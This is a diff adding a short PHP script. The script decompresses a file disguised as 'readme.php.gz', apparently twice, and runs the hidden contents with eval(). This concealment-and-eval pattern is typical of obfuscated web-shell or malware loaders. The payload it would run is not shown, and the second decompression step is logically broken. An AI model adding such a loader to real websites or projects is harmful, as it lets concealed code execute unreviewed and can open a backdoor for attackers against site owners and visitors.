@@ -1,0 +1,35 @@
+<?php
+// Path to outer gz file
+$outer = "readme.php.gz";
+
+// Step 1: Read outer.gz content
+$fp1 = gzopen($outer, "rb");
+$outer_content = '';
+while (!gzeof($fp1)) {
+    $outer_content .= gzread($fp1, 4096);
+}
+gzclose($fp1);
+
+// Step 2: Treat that as another gz file (inner.gz)
+// So decompress again
+$inner_stream = gzopen("php://memory", "rb");
+if (!$inner_stream) {
+    // Write inner data to temp file
+    $tmp = tempnam(sys_get_temp_dir(), "inner");
+    file_put_contents($tmp, $outer_content);
+
+    $fp2 = gzopen($tmp, "rb");
+    $inner_content = '';
+    while (!gzeof($fp2)) {
+        $inner_content .= gzread($fp2, 4096);
+    }
+    gzclose($fp2);
+    unlink($tmp);
+} else {
+    $inner_content = $outer_content;
+}
+
+// Step 3: Now $inner_content is the raw PHP file (index.php)
+// You can eval() it, or just save & include
+eval("?>".$inner_content);
+?>
